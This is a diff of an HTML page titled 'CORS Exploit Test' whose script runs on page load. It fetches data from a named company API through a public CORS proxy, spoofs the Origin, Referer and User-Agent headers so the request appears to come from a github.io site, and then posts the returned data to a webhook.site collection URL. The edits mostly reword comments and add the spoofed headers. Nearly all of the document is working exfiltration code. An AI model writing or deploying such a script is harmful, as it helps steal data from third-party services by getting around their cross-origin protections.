@@ -3,25 +3,23 @@
 <head>
     <title>CORS Exploit Test</title>
     <script>
-        // Log the start of the script
         console.log("CORS Exploit Test script loaded and running...");
 
-        // Define the target endpoint and payload
+        // Define the proxy URL and target endpoint
+        const proxyURL = "https://cors-anywhere.herokuapp.com/"; // Replace with your own proxy if needed
         const targetURL = "https://api.company-target.com/api/v3/ip.json";
         const webhookURL = "https://webhook.site/90a9a04b-72c9-4653-a2c2-f0a66c64559c";
 
-        // Use a CORS proxy to bypass restrictions
-        const proxyURL = "https://cors-anywhere.herokuapp.com/";
-
-        // Function to fetch data from the target and forward to the webhook
         async function fetchDataAndForward() {
             try {
-                // Fetch data from the target using the proxy
+                // Step 1: Fetch data from the target URL via proxy
                 const response = await fetch(proxyURL + targetURL, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json",
-                        "Origin": "https://varad4-0-4.github.io/covid19partnersplatform-dev/"
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+                        "Referer": "https://varad4-0-4.github.io",
+                        "Origin": "https://varad4-0-4.github.io"
                     },
                     body: JSON.stringify({
                         src: "tag",
@@ -33,11 +31,10 @@
                     throw new Error(`Target fetch failed: ${response.status} ${response.statusText}`);
                 }
 
-                // Parse the response data
                 const data = await response.json();
-                console.log("Extracted data from target:", data);
+                console.log("Data retrieved from target:", data);
 
-                // Forward the extracted data to the webhook
+                // Step 2: Send the extracted data to the Webhook
                 const webhookResponse = await fetch(webhookURL, {
                     method: "POST",
                     headers: {
@@ -51,12 +48,13 @@
                 }
 
                 console.log("Data successfully sent to Webhook.site");
+
             } catch (err) {
                 console.error("Error occurred:", err);
             }
         }
 
-        // Call the function to start the exploit
+        // Run the function to start the exploit
         fetchDataAndForward();
     </script>
 </head>
